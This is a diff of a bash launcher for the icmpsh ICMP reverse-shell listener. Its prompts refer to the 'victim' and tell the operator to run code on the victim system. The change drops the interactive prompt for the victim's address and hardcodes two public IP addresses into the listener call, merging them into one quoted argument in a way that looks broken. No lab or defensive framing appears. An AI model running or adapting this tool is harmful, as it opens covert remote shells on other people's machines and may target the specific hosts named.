@@ -18,7 +18,7 @@ IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
 echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
 echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
-read VICTIM
+
 echo ""
 echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the listender has started:"
 echo ""
@@ -41,7 +41,7 @@ fi
 echo ""
 echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
 echo ""
-python icmpsh_m.py "$IP" "$VICTIM"
+python icmpsh_m.py "54.93.213.64 31.168.227.138"
 if [ "$ICMPDIS" = "disabled" ]
                 then
                                 echo ""
@@ -53,4 +53,3 @@ if [ "$ICMPDIS" = "disabled" ]
 fi
 
 exit 0
-
